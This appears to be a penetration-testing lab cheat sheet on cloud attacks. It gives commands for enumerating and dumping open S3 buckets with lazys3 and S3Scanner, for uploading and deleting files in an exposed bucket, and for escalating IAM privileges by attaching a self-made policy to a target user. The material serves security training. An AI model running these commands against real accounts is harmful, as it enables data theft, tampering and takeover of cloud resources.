# Cloud computing

## Perform S3 bucket enumeration using various S3 bucket enumeration tools

- Enumerate S3 buckets using lazys3

```bash
ruby lazys3.rb
ruby lazys3.rb [Company]
```

- Enumerate S3 buckets using S3Scanner

```bash
cd S3Scanner/
pip3 install -r requirements.txt
python3 ./s3scanner.py sites.txt
```

  1. Dump all open buckets and log both open and closed buckets in found.txt:  
    `python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt`
  2. Just log open buckets in the default output file (buckets.txt):  
    `python3 ./s3scanner.py names.txt`
  3. Save the file listings of all open buckets to a file:  
    `python ./s3scanner.py --list names.txt`

## Exploit S3 buckets

- Exploit open S3 buckets using AWS CLI

```bash
pip3 install awscli
aws configure
aws s3 ls s3://[Bucket Name]
aws s3 mv Hack.txt s3://certifiedhacker1
aws s3 rm s3://certifiedhacker1/Hack.txt
```

## Perform privilege escalation to gain higher privileges

- Escalate IAM user privileges by exploiting misconfigured user policy

```bash
aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[AccountID]:policy/user-policy
aws iam list-attached-user-policies --user-name [Target Username]
aws iam list-users
```

List of S3 buckets: `aws s3api list-buckets --query "Buckets.Name"`  
User Policies: `aws iam list-user-policies`  
Role Policies: `aws iam list-role-policies`  
Group policies: `aws iam list-group-policies`  
Create user: `aws iam create-user`
